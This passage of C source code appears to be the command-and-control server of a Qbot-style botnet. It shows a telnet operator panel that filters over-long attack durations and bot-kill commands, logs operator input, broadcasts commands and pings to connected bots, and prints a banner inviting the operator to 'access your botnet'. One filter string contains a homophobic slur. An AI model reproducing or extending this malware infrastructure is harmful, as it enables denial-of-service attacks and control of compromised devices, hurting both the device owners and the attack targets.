		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
		if(strstr(buf, "9999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        }
		if(strstr(buf, "99999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
    	if(strstr(buf, "999999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
	    if(strstr(buf, "9999999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
	    if(strstr(buf, "999999999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
	    if(strstr(buf, "999999999999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        }
	    if(strstr(buf, "LOLNOGTFO")) 
		{  
		printf("ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("KILL.log", "a");
        fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        }
	    if(strstr(buf, "GTFOFAG")) 
		{  
		printf("ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("KILL.log", "a");
        fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
				}
     			trim(buf);
                if(send(thefd, "\x1b[31m~> \x1b[36m", 11, MSG_NOSIGNAL) == -1) goto end;
                if(strlen(buf) == 0) continue;
                printf("%s: \"%s\"\n",accounts[find_line].id, buf);
                FILE *logFile;
                logFile = fopen("report.log", "a");
                fprintf(logFile, "%s: \"%s\"\n",accounts[find_line].id, buf);
                fclose(logFile);
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
        }
 
        end:    // cleanup dead socket
                managements[thefd].connected = 0;
                close(thefd);
                managesConnected--;
}
void *telnetListener(int port)
{
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)
        {
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}
 
int main (int argc, char *argv[], void *sock)
{
        signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4)
        {
                fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
                exit (EXIT_FAILURE);
        }
		port = atoi(argv[3]);
		printf("\x1b[32mDeathStar Lazer Charged,\x1b[31m You May \x1b[36mNow Access \x1b[32mYour \x1b[36mBotnet\x1b[31m\n");
        telFD = fopen("bots.txt", "a+");
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]); // try to create a listening socket, die if we can't
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD); // try to make it nonblocking, die if we can't
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN); // listen with a huuuuge backlog, die if we can't
        if (s == -1)
        {
                perror ("listen");
                abort ();
        }
        epollFD = epoll_create1 (0); // make an epoll listener, die if we can't
        if (epollFD == -1)
        {
                perror ("epoll_create");
                abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
                perror ("epoll_ctl");
                abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--)
        {
                pthread_create( &thread[threads + 2], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
        }
        pthread_create(&thread[0], NULL, &telnetListener, port);
        while(1)
        {
                broadcast("PING", -1, "SithHQ");
                sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}